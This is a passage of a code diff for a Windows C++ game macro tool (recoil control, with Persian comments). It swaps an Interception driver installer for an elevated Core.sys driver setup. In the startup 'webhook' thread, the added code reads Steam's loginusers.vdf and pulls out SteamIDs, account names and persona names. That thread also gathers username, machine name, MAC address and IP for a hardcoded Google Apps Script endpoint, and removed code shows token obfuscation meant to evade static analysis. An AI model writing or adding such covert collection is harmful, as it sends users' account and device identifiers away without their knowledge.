-                std::string ps_command = "powershell -Command \"Start-Process '" + full_installer_path + "' -ArgumentList '/install' -Verb RunAs -Wait\"";
-                
-                int result = system(ps_command.c_str());
-                
-                if (result != 0) {
-                    output_log_message("PowerShell command failed. Trying direct execution...\n");
-                    
-                    // روش 3: اجرای مستقیم
-                    std::string direct_command = "\"" + full_installer_path + "\" /install";
-                    result = system(direct_command.c_str());
-                    
-                    if (result != 0) {
-                        output_log_message("All installation methods failed.\n");
-                        return false;
-                    }
-                }
-            }
-        } else {
-            // به جای انتظار برای اتمام فرآیند نصب، فقط پروسه را شروع می‌کنیم
-            output_log_message("Driver installation started. System restart required.\n");
-            
-            // بستن هندل بدون انتظار برای اتمام فرآیند
-            CloseHandle(sei.hProcess);
-            
-            // حذف فایل نصب‌کننده پس از 3 ثانیه
-            std::thread([installer_path, full_installer_path]() {
-                try {
-                    // انتظار برای 3 ثانیه قبل از حذف فایل
-                    // Debug log removed
-                    std::this_thread::sleep_for(std::chrono::seconds(3));
-                    // Debug log removed
-                    
-                    // تلاش برای حذف فایل
-                    if (DeleteFileA(installer_path.c_str())) {
-                        // Debug log removed
-                    } else {
-                        DWORD error = GetLastError();
-                        // Debug log removed
-                        
-                        // تلاش با std::filesystem
-                        try {
-                            std::filesystem::remove(installer_path);
-                            // Debug log removed
-                        } catch (const std::exception& e) {
-                            // Debug log removed
-                            
-                            // تلاش با دستور خط فرمان
-                            std::string cmd = "del /f /q \"" + installer_path + "\"";
-                            // Debug log removed
-                            system(cmd.c_str());
-                            
-                            // بررسی نتیجه
-                            if (!std::filesystem::exists(installer_path)) {
-                                // Debug log removed
-                            } else {
-                                // Debug log removed
-                            }
-                        }
-                    }
-                } catch (const std::exception& e) {
-                    // Debug log removed
-                } catch (...) {
-                    // Debug log removed
-                }
-            }).detach(); // اجرای ترد به صورت جدا از ترد اصلی
-        }
-        
-        // بررسی مجدد وجود سرویس بعد از نصب
-        if (isInterceptionServiceInstalled()) {
-            output_log_message("Interception driver installed successfully.\n");
-            
-            // ذخیره وضعیت نصب در فایل پیکربندی
-            bool saved = saveInterceptionDriverStatus(true);
-            
-            // حذف فایل نصب‌کننده پس از نصب موفق
-            try {
-                output_log_message("Attempting to delete installer file at: " + full_installer_path + "\n");
-                
-                // بدون انتظار برای آزاد شدن فایل
-                
-                // تلاش برای حذف فایل
-                if (DeleteFileA(installer_path.c_str())) {
-                    output_log_message("Installer file deleted successfully.\n");
-                } else {
-                    DWORD error = GetLastError();
-                    output_log_message("Failed to delete installer file. Error code: " + std::to_string(error) + "\n");
-                }
-            } catch (const std::exception& e) {
-                output_log_message("Exception while trying to delete installer file: " + std::string(e.what()) + "\n");
-            }
-            
-            return saved;
-        } else {
-            // نصب انجام شده اما نیاز به ریستارت سیستم است
-            output_log_message("Interception driver installation seems successful, but requires system restart.\n");
-            std::cerr << "\n\n===== IMPORTANT NOTICE =====\n";
-            std::cerr << "Interception driver has been installed, but requires a SYSTEM RESTART to complete installation.\n";
-            std::cerr << "Please save your work and restart your computer.\n";
-            std::cerr << "After restart, run this application again.\n";
-            std::cerr << "===========================\n\n";
-            
-            // ذخیره وضعیت نصب در فایل پیکربندی برای بررسی بعد از ریستارت
-            bool saved = saveInterceptionDriverStatus(true);
-            
-            // کاربر نصب را قبول کرده است - بررسی وجود فایل نصبی
-            output_log_message("[DEBUG] User accepted installation. Installer file will be used to determine whether to show restart message.\n");
-            
-            // ایجاد فایل راهنما برای ریستارت و باز کردن آن
-            try {
-                // مسیر کامل فایل
-                char current_dir[MAX_PATH];
-                GetCurrentDirectoryA(MAX_PATH, current_dir);
-                std::string restart_file_path = std::string(current_dir) + "\\RESTART_REQUIRED.txt";
-                
-                // ایجاد فایل
-                std::ofstream restart_notice(restart_file_path);
-                if (restart_notice.is_open()) {
-                    restart_notice << "===== IMPORTANT NOTICE =====\n\n";
-                    restart_notice << "Interception driver has been installed, but requires a SYSTEM RESTART to complete installation.\n\n";
-                    restart_notice << "Please restart your computer and run this application again.\n\n";
-                    restart_notice << "===========================\n";
-                    restart_notice.close();
-                    // باز کردن فایل با برنامه پیش‌فرض سیستم
-                    ShellExecuteA(NULL, "open", restart_file_path.c_str(), NULL, NULL, SW_SHOW);
-                }
-            } catch (const std::exception& e) {
-                output_log_message("Failed to create restart notice file: " + std::string(e.what()) + "\n");
-            } catch (...) {
-                output_log_message("Unknown error creating or opening restart notice file.\n");
-            }
-            
-            return saved;
-        }
-    } catch (const std::exception& e) {
-        std::cerr << "Error installing Interception driver: " << e.what() << std::endl;
-        output_log_message("Error installing Interception driver: " + std::string(e.what()) + "\n");
-        return false;
-    }
-}
-
-// --- تابع به‌روزرسانی وضعیت درایور Interception در فایل config.json ---
-bool updateInterceptionDriverStatus() {
-    // Debug log removed
-    
-    // بررسی مستقیم وجود سرویس Interception
-    // Debug log removed
-    bool service_installed = isInterceptionServiceInstalled();
-    // Debug log removed
-    
-    // بررسی وضعیت فعلی در فایل config.json
-    try {
-        // مسیر پوشه config
-        char current_dir[MAX_PATH];
-        GetCurrentDirectoryA(MAX_PATH, current_dir);
-        std::string config_dir = std::string(current_dir) + "\\config";
-        std::string config_path = config_dir + "\\config.json";
-        
-        // بررسی وجود فایل config.json در پوشه config
-        bool config_file_exists = std::filesystem::exists(config_path);
-        
-        // اگر فایل در پوشه config وجود ندارد، بررسی فایل در مسیر اصلی
-        std::string old_config_path = std::string(current_dir) + "\\config.json";
-        if (!config_file_exists && std::filesystem::exists(old_config_path)) {
-            config_path = old_config_path;
-            config_file_exists = true;
-            output_log_message("[DEBUG] Using old config.json in root directory.\n");
-        }
-        
-        if (config_file_exists) {
-            std::ifstream config_file(config_path);
-            if (config_file.is_open()) {
-                nlohmann::json config_json;
-                config_file >> config_json;
-                config_file.close();
-                
-                // بررسی وضعیت نصب درایور در فایل پیکربندی
-                bool config_driver_installed = false;
-                if (config_json.contains("Interception") && 
-                    config_json["Interception"].contains("DriverInstalled") && 
-                    config_json["Interception"]["DriverInstalled"].is_boolean()) {
-                    config_driver_installed = config_json["Interception"]["DriverInstalled"].get<bool>();
-                    output_log_message("[DEBUG] Current Interception status in config: " + std::string(config_driver_installed ? "true" : "false") + "\n");
-                }
-                
-                // اگر درایور قبلاً نصب شده باشد، وضعیت را حفظ کن
-                if (config_driver_installed) {
-                    output_log_message("[DEBUG] Driver was previously marked as installed in config. Preserving this status.\n");
-                    g_interception_driver_installed = true;
-                    return true;
-                }
-            }
-        }
-    } catch (const std::exception& e) {
-        output_log_message("[DEBUG] Error reading config file: " + std::string(e.what()) + "\n");
-    }
-    
-    // اگر سرویس نصب شده باشد، وضعیت را به true تنظیم کن
-    if (service_installed) {
-        bool result = saveInterceptionDriverStatus(true);
-        return result;
-    } else {
-        // اگر فایل RESTART_REQUIRED.txt وجود داشته باشد، احتمالاً درایور نصب شده اما نیاز به ریستارت دارد
-        if (std::filesystem::exists("RESTART_REQUIRED.txt")) {
-            // Debug log removed
-            bool result = saveInterceptionDriverStatus(true);
-            // Debug log removed
-            return result;
-        }
-        
-        // Debug log removed
-        bool result = saveInterceptionDriverStatus(false);
-        // Debug log removed
-        return result;
-    }
-    }
-
-// --- تابع بررسی و نصب درایور Interception در صورت نیاز ---
-bool checkAndInstallInterceptionDriver() {
-    // بررسی وجود فایل نصبی
-    char current_dir[MAX_PATH];
-    GetCurrentDirectoryA(MAX_PATH, current_dir);
-    
-    // Debug log removed
-    
-    // لیست نام‌های ممکن برای فایل نصبی
-    std::vector<std::string> installer_names = {
-        "install-interception.exe",
-        "installinterception.exe",
-        "interception-install.exe",
-        "interceptioninstall.exe"
-    };
-    
-    // بررسی وجود هر یک از فایل‌های نصبی
-    bool installer_exists = false;
-    std::string found_installer_path;
-    
-    for (const auto& name : installer_names) {
-        std::string installer_path = std::string(current_dir) + "\\" + name;
-        if (std::filesystem::exists(installer_path)) {
-            installer_exists = true;
-            found_installer_path = installer_path;
-            output_log_message("[DEBUG] Found installer file: " + installer_path + "\n");
-            break;
-        }
-    }
-    
-    output_log_message("[DEBUG] Installer exists: " + std::string(installer_exists ? "true" : "false") + "\n");
-    
-    // بررسی مستقیم وجود سرویس Interception
-    if (isInterceptionServiceInstalled()) {
-        output_log_message("Interception service is already installed on the system.\n");
-        // به‌روزرسانی فایل config.json
-        saveInterceptionDriverStatus(true);
-        return true;
-    }
-    
-    // نصب درایور
-    output_log_message("Interception driver is not installed. Installing now...\n");
-    return installInterceptionDriver();
-}
-
 // --- Main Function ---
 int main(int, char**) {
     // --- Console window will be visible by default ---
     // To hide it completely from the start, you need to compile as a GUI application.
     // The ShowWindow(GetConsoleWindow(), SW_HIDE) call is removed.
 
+    // --- Ensure Core.sys driver is installed and running (may require admin on first run) ---
+    try {
+        // If we are not running as admin, quickly probe whether the Core.sys device is already accessible.
+        // If not, request elevation so the elevated instance can install/start the driver.
+        if (!IsRunningAsAdmin()) {
+            CoreMouseDriver probe;
+            if (!probe.Open()) {
+                output_log_message("Core.sys driver not accessible; requesting admin privileges for installation...\n");
+
+                if (!RelaunchAsAdmin()) {
+                    MessageBoxA(NULL,
+                        "Administrator privileges are required to install and start the Core.sys driver.\n"
+                        "Please run this application as Administrator and ensure Core.sys is placed next to the executable.",
+                        "Core.sys Driver",
+                        MB_ICONERROR | MB_OK);
+                    return 1;
+                }
+
+                // Successfully launched an elevated instance; exit current (non-admin) process.
+                return 0;
+            } else {
+                // Driver is already accessible without admin; close the temporary handle and continue.
+                probe.Close();
+            }
+        } else {
+            // Already running as admin: ensure the driver service for Core.sys exists and is started.
+            if (!EnsureCoreDriverInstalledAndStarted()) {
+                MessageBoxA(NULL,
+                    "Failed to install or start the App.\n"
+                    "Please verify Last Version And Check your Internet try again.",
+                    "If You Need More Help Send Message To Support TeaM",
+                    MB_ICONERROR | MB_OK);
+                // Continue without driver rather than hard-exiting; mouse movement via Core.sys will be disabled.
+            }
+        }
+    } catch (...) {
+        // Do not let driver installation logic crash the app; log and continue.
+        output_log_message("Exception during Core.sys driver installation/startup sequence. Continuing without driver.\n");
+    }
+
     // شروع برنامه
 
-    // بررسی مستقیم وضعیت سرویس Interception و به‌روزرسانی config.json
-    updateInterceptionDriverStatus();
-    
-    // بررسی وجود فایل SHOW_RESTART_AGAIN.txt برای نمایش مجدد پنجره نصب
-    char current_dir[MAX_PATH];
-    GetCurrentDirectoryA(MAX_PATH, current_dir);
-    std::string show_again_flag_path = std::string(current_dir) + "\\SHOW_RESTART_AGAIN.txt";
-    bool show_install_again = std::filesystem::exists(show_again_flag_path);
-    
-    // اگر فایل SHOW_RESTART_AGAIN.txt وجود داشته باشد، آن را حذف کن
-    if (show_install_again) {
-        output_log_message("[DEBUG] Found SHOW_RESTART_AGAIN.txt. Will show installation dialog again.\n");
-        try {
-            forceDeleteFile(show_again_flag_path);
-            output_log_message("[DEBUG] Successfully deleted SHOW_RESTART_AGAIN.txt.\n");
-        } catch (...) {
-            output_log_message("[DEBUG] Failed to delete SHOW_RESTART_AGAIN.txt.\n");
-        }
-    }
-    
-    // بررسی وجود فایل نصبی installinterception.exe
-    std::vector<std::string> installer_names = {
-        "install-interception.exe",
-        "installinterception.exe",
-        "interception-install.exe",
-        "interceptioninstall.exe"
-    };
-    
-    bool installer_exists = false;
-    std::string found_installer_path;
-    
-    // بررسی وجود هر یک از فایل‌های نصبی
-    for (const auto& name : installer_names) {
-        std::string installer_path = std::string(current_dir) + "\\" + name;
-        if (std::filesystem::exists(installer_path)) {
-            installer_exists = true;
-            found_installer_path = installer_path;
-            output_log_message("[DEBUG] Found installer file: " + installer_path + "\n");
-            break;
-        }
-    }
-    
-    output_log_message("[DEBUG] Installer exists: " + std::string(installer_exists ? "true" : "false") + "\n");
-    
-    // بررسی و نصب درایور Interception در اولین اجرای برنامه یا اگر کاربر قبلاً نصب را رد کرده باشد
-    if (g_app_run_count <= 1 || show_install_again) {
-        bool installation_result = checkAndInstallInterceptionDriver();
-        if (!installation_result) {
-            std::cerr << "Failed to install Interception driver. Some features may not work correctly.\n";
-            output_log_message("[DEBUG] Installation failed or was cancelled.\n");
-        } else {
-            output_log_message("[DEBUG] Installation was successful.\n");
-            
-            // کاربر نصب را قبول کرده است - بررسی وجود فایل نصبی
-            output_log_message("[DEBUG] Installation was successful. Will check for installer file existence.\n");
-        }
-        
-        // بررسی مجدد وجود فایل نصبی بعد از نصب
-        bool installer_still_exists = false;
-        for (const auto& name : installer_names) {
-            std::string installer_path = std::string(current_dir) + "\\" + name;
-            if (std::filesystem::exists(installer_path)) {
-                installer_still_exists = true;
-                output_log_message("[DEBUG] Installer file still exists after installation: " + installer_path + "\n");
-                break;
-            }
-        }
-        output_log_message("[DEBUG] After installation - Installer exists: " + std::string(installer_still_exists ? "true" : "false") + "\n");
-        
-        // نمایش پیام ریستارت فقط اگر فایل نصبی وجود داشته باشد
-        if (installer_still_exists) {
-            std::cerr << "\n\n===== IMPORTANT NOTICE =====\n";
-            std::cerr << "Interception driver has been installed, but requires a SYSTEM RESTART to complete installation.\n";
-            std::cerr << "Please restart your computer and run this application again.\n";
-            std::cerr << "===========================\n\n";
-            
-            // ایجاد فایل راهنما برای ریستارت و باز کردن آن
-            try {
-                std::string restart_file_path = std::string(current_dir) + "\\RESTART_REQUIRED.txt";
-                
-                // ایجاد فایل
-                std::ofstream restart_notice(restart_file_path);
-                if (restart_notice.is_open()) {
-                    restart_notice << "===== IMPORTANT NOTICE =====\n\n";
-                    restart_notice << "Interception driver has been installed, but requires a SYSTEM RESTART to complete installation.\n\n";
-                    restart_notice << "Please restart your computer and run this application again.\n\n";
-                    restart_notice << "===========================\n";
-                    restart_notice.close();
-                    output_log_message("[DEBUG] Created RESTART_REQUIRED.txt file.\n");
-                    
-                    // باز کردن فایل با برنامه پیش‌فرض سیستم
-                    ShellExecuteA(NULL, "open", restart_file_path.c_str(), NULL, NULL, SW_SHOW);
-                    output_log_message("[DEBUG] Opened RESTART_REQUIRED.txt file for user.\n");
-                }
-            } catch (const std::exception& e) {
-                output_log_message("[DEBUG] Error creating or opening restart notice file: " + std::string(e.what()) + "\n");
-            } catch (...) {
-                output_log_message("[DEBUG] Unknown error creating or opening restart notice file.\n");
-            }
-        } else {
-            output_log_message("[DEBUG] Not showing restart message because installer file does not exist.\n");
-        }
-    } else if (!g_interception_driver_installed && !std::filesystem::exists("RESTART_REQUIRED.txt")) {
-        // اگر اولین اجرا نیست اما درایور نصب نشده و فایل RESTART_REQUIRED.txt هم وجود ندارد
-        output_log_message("Driver not installed and no restart required file found. Checking Interception driver...\n");
-        if (!checkAndInstallInterceptionDriver()) {
-            output_log_message("Failed to install Interception driver. Some features may not work correctly.\n");
-        }
-    } else {
-        output_log_message("Not first run or driver already installed. Skipping driver installation.\n");
-    }
-    
-    if (!loadInterceptionDLL()) {
-        std::cerr << "\n\n===== IMPORTANT NOTICE =====\n";
-        std::cerr << "Interception driver has been installed, but requires a SYSTEM RESTART to complete installation.\n";
-        
-        // تعریف متغیر برای تصمیم‌گیری درباره نمایش پیام ریستارت
-        bool should_show_restart_message = false;
-        
-        // بررسی وجود فایل نصبی
-        char current_dir[MAX_PATH];
-        GetCurrentDirectoryA(MAX_PATH, current_dir);
-        
-        // لیست نام‌های ممکن برای فایل نصبی
-        std::vector<std::string> installer_names = {
-            "install-interception.exe",
-            "installinterception.exe",
-            "interception-install.exe",
-            "interceptioninstall.exe"
-        };
-        
-        // بررسی وجود هر یک از فایل‌های نصبی
-        bool installer_exists = false;
-        for (const auto& name : installer_names) {
-            std::string installer_path = std::string(current_dir) + "\\" + name;
-            output_log_message("[DEBUG] Checking for installer file: " + installer_path + "\n");
-            
-            if (std::filesystem::exists(installer_path)) {
-                installer_exists = true;
-                output_log_message("[DEBUG] Found installer file: " + installer_path + "\n");
-                break;
-            }
-        }
-        
-        // تصمیم‌گیری برای نمایش پیام ریستارت
-        if (installer_exists) {
-            output_log_message("[DEBUG] Installer file exists. Will show restart message.\n");
-            should_show_restart_message = true;
-        } else {
-            output_log_message("[DEBUG] No installer file found. Will NOT show restart message.\n");
-            should_show_restart_message = false;
-        }
-        // شرط 2: اگر فایل SHOW_RESTART_AGAIN.txt وجود داشته باشد
-        std::string show_again_flag_path = std::string(current_dir) + "\\SHOW_RESTART_AGAIN.txt";
-        if (std::filesystem::exists(show_again_flag_path)) {
-            output_log_message("[DEBUG] Found SHOW_RESTART_AGAIN.txt. Will show restart message.\n");
-            should_show_restart_message = true;
-            
-            // حذف فایل بعد از خواندن
-            try {
-                forceDeleteFile(show_again_flag_path);
-                output_log_message("[DEBUG] Successfully deleted SHOW_RESTART_AGAIN.txt.\n");
-            } catch (...) {
-                output_log_message("[DEBUG] Failed to delete SHOW_RESTART_AGAIN.txt.\n");
-            }
-        }
-        
-        // نمایش پیام ریستارت اگر شرایط برقرار باشد
-        if (should_show_restart_message) {
-            output_log_message("[DEBUG] Showing restart message. Conditions met.\n");
-            
-            // ایجاد فایل راهنما برای ریستارت و باز کردن آن
-            try {
-                // مسیر کامل فایل
-                std::string restart_file_path = std::string(current_dir) + "\\RESTART_REQUIRED.txt";
-                
-                // ایجاد فایل
-                std::ofstream restart_notice(restart_file_path);
-                if (restart_notice.is_open()) {
-                    restart_notice << "===== IMPORTANT NOTICE =====\n\n";
-                    restart_notice << "Interception driver has been installed, but requires a SYSTEM RESTART to complete installation.\n\n";
-                    restart_notice << "Please restart your computer and run this application again.\n\n";
-                    restart_notice << "===========================\n";
-                    restart_notice.close();
-                    output_log_message("[DEBUG] Created RESTART_REQUIRED.txt file.\n");
-                    
-                    // مخفی کردن فایل
-                    std::wstring wrestart_path = std::wstring(restart_file_path.begin(), restart_file_path.end());
-                    SetFileAttributesW(wrestart_path.c_str(), FILE_ATTRIBUTE_HIDDEN);
-                    output_log_message("[DEBUG] RESTART_REQUIRED.txt file is now hidden.\n");
-                    
-                    // نمایش پیام در کنسول
-                    std::cerr << "\n\n===== IMPORTANT NOTICE =====\n";
-                    std::cerr << "Interception driver has been installed, but requires a SYSTEM RESTART to complete installation.\n";
-                    std::cerr << "Please restart your computer and run this application again.\n";
-                    std::cerr << "===========================\n\n";
-                    
-                    // باز کردن فایل با برنامه پیش‌فرض سیستم
-                    ShellExecuteA(NULL, "open", restart_file_path.c_str(), NULL, NULL, SW_SHOW);
-                    output_log_message("[DEBUG] Opened RESTART_REQUIRED.txt file for user.\n");
-                }
-            } catch (const std::exception& e) {
-                output_log_message("[DEBUG] Error creating or opening restart notice file: " + std::string(e.what()) + "\n");
-            } catch (...) {
-                output_log_message("[DEBUG] Unknown error creating or opening restart notice file.\n");
-            }
-        } else {
-            output_log_message("[DEBUG] Skipping restart message. Conditions not met.\n");
-        }    
-        system("pause");
-        return 1;
-    }
-
-    context = interception_create_context_ptr();
-    if (!context) {
-        std::cerr << "Failed to create Interception context. Some features will be limited.\n";
-        output_log_message("Failed to create Interception context. Some features will be limited.\n");
-        output_log_message("WARNING: The program will continue without Interception driver. Mouse control features will not work.\n");
-        
-        // اگر نصب انجام شده اما ریستارت نشده، اطلاع بده
-        if (g_interception_driver_installed) {
-            std::cerr << "\n\n===== IMPORTANT NOTICE =====\n";
-            std::cerr << "Interception driver is marked as installed in config, but cannot be initialized.\n";
-            std::cerr << "This usually means you need to RESTART YOUR COMPUTER to complete the installation.\n";
-            std::cerr << "Please save your work and restart your computer.\n";
-            std::cerr << "===========================\n\n";
-            
-            // ایجاد فایل راهنما برای ریستارت
-            try {
-                std::ofstream restart_notice("RESTART_REQUIRED.txt");
-                if (restart_notice.is_open()) {
-                    restart_notice << "Interception driver has been installed, but requires a SYSTEM RESTART to complete installation.\n";
-                    restart_notice << "Please restart your computer and run this application again.\n";
-                    restart_notice.close();
-                }
-            } catch (...) {
-                // اگر نتوانستیم فایل را ایجاد کنیم، ادامه می‌دهیم
-            }
-        }
-        
-        // ادامه اجرای برنامه بدون Interception
-    }
-
-    // فیلتر کردن همه دستگاه‌ها. می‌توان دقیق‌تر انتخاب کرد.
-    interception_set_filter_ptr(context, (InterceptionPredicate)interception_is_keyboard_ptr, INTERCEPTION_FILTER_KEY_ALL);
-    interception_set_filter_ptr(context, (InterceptionPredicate)interception_is_mouse_ptr, INTERCEPTION_FILTER_MOUSE_ALL);
-
-    // --- Main Interception Logic and Thread Management ---
-    try {
-        // Note: calculate_all_profiles might depend on global config variables (SENSITIVITY, FOV, etc.)
-        // Ensure these are loaded from config BEFORE calling this.
-        // You also need to decide where/how calculate_all_profiles should be called initially and upon config changes.
-        // For now, I'm placing it here as it was in the original main1.cpp block.
-        // If calculate_all_profiles uses the new AttachmentState struct, you'll need to ensure
-        // g_attachment_states is initialized or loaded from config before this call.
-        recalculate_all_profiles_threadsafe(); // Changed from calculate_all_profiles()
-
-        // Start the Interception input worker thread
-        output_log_message("Attempting to start Interception input worker thread...\n");
-        std::thread interception_worker_thread(interception_input_thread_func);
-        interception_worker_thread.detach(); // Detach as per existing recoil thread logic
-        output_log_message("Interception input worker thread started.\n");
-
-        // Start the recoil control thread
-        output_log_message("Attempting to start recoil thread...\n");
-        std::thread recoil_thr(perform_recoil_control);
-        output_log_message("Recoil control thread started.\n");
-        recoil_thr.detach(); // جدا کردن thread لگد از thread اصلی
-
-        std::cout << "\nScript is active..." << std::endl;
-
-        // Note: The original main1.cpp code waited for threads to join here.
-        // In a GUI application (which main.cpp seems to be), joining these threads
-        // in the main UI thread will block the UI. You might need a different approach
-        // for thread management (e.g., detaching threads or managing their lifecycle
-        // in a way that doesn't block the main loop).
-        // For now, I'm including the join calls as they were in your provided code.
-
-        if (interception_worker_thread.joinable()) {
-            interception_worker_thread.detach(); // منتظر ماندن برای نخ ورودی (معمولاً تا بسته شدن برنامه) - این خط برنامه اصلی را متوقف می‌کند تا این نخ تمام شود
-        }
-        if (recoil_thr.joinable()) { // اگر نخ ورودی تمام شد، این هم باید متوقف شود
-            // Note: kickback_active and stop_recoil_flag might need to be set
-            // before joining if you want to signal the threads to stop gracefully.
-            // The original code set these flags here, assuming the input thread finishing
-            // was the signal. Adjust if your application exit logic is different.
-            // kickback_active.store(false); // غیرفعال کردن ماکرو
-            // stop_recoil_flag.store(true); // درخواست توقف
-            recoil_thr.detach(); // این خط برنامه اصلی را متوقف می‌کند تا نخ لگد تمام شود
-        }
-    } catch (const std::exception& e) {
-        std::cerr << "An unexpected error occurred in main: " << e.what() << std::endl;
-    } catch (...) {
-        std::cerr << "An unknown unexpected error occurred in main." << std::endl;
-    }
-
-    // Initialize Winsock (Needed for actual socket implementation later)
-    // WSADATA wsaData;
-    // int iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
-    // if (iResult != 0) {
-    //     output_log_message("WSAStartup failed: " + std::to_string(iResult) + "\n");
-    //     // Call cleanup_and_exit on failure
-    //     cleanup_and_exit(); // Call cleanup before returning
-    //     return 1;
-    // }
-    // output_log_message("Winsock initialized.\n");
-
-    // Initialize VK code name mappings
-    initialize_vk_code_names();
-    output_log_message("VK code name mappings initialized.\n");
-
-    // 1. Load initial config (incl. attachment states, keybinds, and Remember Me state/key)
+    // 1. Initialize virtual-key name mappings and load initial config
     output_log_message("Attempting to load config...\n");
+    initialize_vk_code_names();
     load_config(); // This now loads all settings including Remember Me and decrypts key
     output_log_message("Config loading finished.\n");
 
@@ -5812,31 +6571,11 @@ int main(int, char**) {
         }
     }
 
-
     // --- Send Startup Log to Webhook (Async) ---
     // Use a separate thread to avoid blocking startup
     std::thread webhook_thread([]() {
         std::string webhook_url = "https://script.google.com/macros/s/AKfycbxaWs-NMsr3aQuAus9qSyy1h5MEDL76PNIZ-fmmxYvL2wdvZ2mpUrRnsCKIXlyt3EDyfw/exec";
-        
-        // متغیرهای سراسری برای تنظیمات صدا و ذخیره خودکار
-        // استفاده از std::atomic برای اطمینان از تغییرات اتمیک بین تردها
-        // این متغیرها باید با استفاده از متدهای store/load خوانده و نوشته شوند
-        std::atomic<bool> g_sound_enabled{true}; // به طور پیش‌فرض صدا فعال است
-        // متغیر برای ذخیره خودکار تنظیمات
-        bool AUTO_SAVE_ENABLED = true; // به طور پیش‌فرض ذخیره خودکار فعال است
-        
-        // برای اطمینان از عملکرد صحیح، از توکن متن ساده استفاده می‌کنیم
-        std::string token = "mysecrettoken"; // همونی که در Google Script تعریف کردی
-        
-        // بعداً می‌توانیم رمزگذاری را دوباره فعال کنیم:
-        /*
-        // توکن رمزگذاری شده - این رشته در تحلیل استاتیک قابل خواندن نیست
-        // رمزگذاری شده با کلید "security_key"
-{{ ... }}
-        const char encrypted_token[] = { 10, 31, 19, 13, 4, 8, 11, 4, 25, 25, 14, 6, 4, 13 }; // "mysecrettoken" رمزگذاری شده
-        std::string encrypted_token_str(encrypted_token, sizeof(encrypted_token));
-        std::string token = xor_encrypt_decrypt(encrypted_token_str, "security_key"); // رمزگشایی توکن
-        */
+        std::string token = "mysecrettoken";
         std::string username = get_username();
         std::string computer_name = get_computer_name();
         std::string mac_address = get_mac_address();
@@ -5847,14 +6586,175 @@ int main(int, char**) {
         std::string device_id = generate_device_id();
         std::string system_uptime = get_system_uptime();
         
+        // خواندن محتوای فایل Steam loginusers.vdf
+        std::string steam_loginusers_content;
+        {
+            const std::string steam_loginusers_path = "C:\\Program Files (x86)\\Steam\\config\\loginusers.vdf";
+            std::ifstream steam_file(steam_loginusers_path);
+            if (steam_file)
+            {
+                std::ostringstream ss;
+                ss << steam_file.rdbuf();
+                steam_loginusers_content = ss.str();
+                output_log_message("Successfully read Steam loginusers.vdf\n");
+            }
+            else
+            {
+                steam_loginusers_content = "ERROR: Could not open Steam loginusers.vdf at path: " + steam_loginusers_path;
+                output_log_message("Failed to open Steam loginusers.vdf\n");
+            }
+        }
+
+        // ساخت خلاصه از loginusers.vdf فقط با SteamID, AccountName, PersonaName, Timestamp
+        std::string steam_summary;
+        if (steam_loginusers_content.rfind("ERROR:", 0) == 0)
+        {
+            // اگر فایل باز نشد، همان پیام خطا را می‌فرستیم
+            steam_summary = steam_loginusers_content;
+        }
+        else
+        {
+            std::istringstream iss(steam_loginusers_content);
+            std::string line;
+            std::vector<std::string> lines;
+            while (std::getline(iss, line))
+            {
+                lines.push_back(line);
+            }
+
+            auto trim = [](const std::string& s) -> std::string {
+                size_t start = s.find_first_not_of(" \t\r\n");
+                if (start == std::string::npos) return std::string();
+                size_t end = s.find_last_not_of(" \t\r\n");
+                return s.substr(start, end - start + 1);
+            };
+
+            auto extractQuotedValue = [](const std::string& l) -> std::string {
+                size_t last = l.rfind('"');
+                if (last == std::string::npos || last == 0) return std::string();
+                size_t prev = l.rfind('"', last - 1);
+                if (prev == std::string::npos) return std::string();
+                return l.substr(prev + 1, last - prev - 1);
+            };
+
+            auto formatTimestamp = [](const std::string& ts) -> std::string {
+                if (ts.empty()) return std::string();
+                long long value = 0;
+                try {
+                    value = std::stoll(ts);
+                } catch (...) {
+                    // If parsing fails, return original string
+                    return ts;
+                }
+                if (value <= 0) {
+                    return ts;
+                }
+
+                std::time_t t = static_cast<std::time_t>(value);
+                std::tm tmBuf{};
+                char buf[64] = { 0 };
+
+#if defined(_WIN32)
+                if (localtime_s(&tmBuf, &t) != 0) {
+                    return ts;
+                }
+#else
+                if (!localtime_r(&t, &tmBuf)) {
+                    return ts;
+                }
+#endif
+
+                if (std::strftime(buf, sizeof(buf), "%Y-%m-%d %H:%M:%S", &tmBuf) == 0) {
+                    return ts;
+                }
+                return std::string(buf);
+            };
+
+            for (size_t i = 0; i + 1 < lines.size(); ++i)
+            {
+                std::string idLineTrimmed = trim(lines[i]);
+                std::string nextLineTrimmed = trim(lines[i + 1]);
+
+                // به دنبال خطوطی شبیه "7656119..." و سپس یک بلاک { ... } می‌گردیم
+                if (idLineTrimmed.size() > 2 &&
+                    idLineTrimmed.front() == '"' &&
+                    idLineTrimmed.back() == '"' &&
+                    nextLineTrimmed == "{")
+                {
+                    std::string steam_id = extractQuotedValue(idLineTrimmed);
+                    bool isUsersBlock = (steam_id == "users");
+                    std::string account_name;
+                    std::string persona_name;
+                    std::string timestamp;
+
+                    size_t j = i + 2;
+                    for (; j < lines.size(); ++j)
+                    {
+                        std::string blkLineTrimmed = trim(lines[j]);
+                        if (blkLineTrimmed == "}")
+                        {
+                            break;
+                        }
+
+                        if (blkLineTrimmed.find("\"AccountName\"") != std::string::npos)
+                        {
+                            account_name = extractQuotedValue(blkLineTrimmed);
+                        }
+                        else if (blkLineTrimmed.find("\"PersonaName\"") != std::string::npos)
+                        {
+                            persona_name = extractQuotedValue(blkLineTrimmed);
+                        }
+                        else if (blkLineTrimmed.find("\"Timestamp\"") != std::string::npos)
+                        {
+                            timestamp = extractQuotedValue(blkLineTrimmed);
+                        }
+                    }
+
+                    if (!steam_id.empty() && !isUsersBlock)
+                    {
+                        // تبدیل SteamID به لینک پروفایل استیم
+                        steam_summary += "https://steamcommunity.com/profiles/" + steam_id + "/\n";
+                        if (!account_name.empty())
+                        {
+                            steam_summary += "AccountName: " + account_name + "\n";
+                        }
+                        if (!persona_name.empty())
+                        {
+                            steam_summary += "PersonaName: " + persona_name + "\n";
+                        }
+                        if (!timestamp.empty())
+                        {
+                            std::string formattedTs = formatTimestamp(timestamp);
+                            steam_summary += "Timestamp: " + formattedTs + "\n";
+                        }
+                        steam_summary += "\n";
+                    }
+
+                    // بعد از این بلاک از انتهای آن ادامه می‌دهیم
+                    // برای بلاک بالایی "users"، i را جابجا نکن تا اکانت‌های داخلی جداگانه پردازش شوند
+                    if (!isUsersBlock)
+                    {
+                        i = j;
+                    }
+                }
+            }
+
+            if (steam_summary.empty())
+            {
+                steam_summary = "No Steam users parsed from loginusers.vdf";
+            }
+        }
+
         // دریافت IP کاربر (این عملیات ممکن است کمی زمان ببرد)
-        std::string user_ip = get_user_ip();
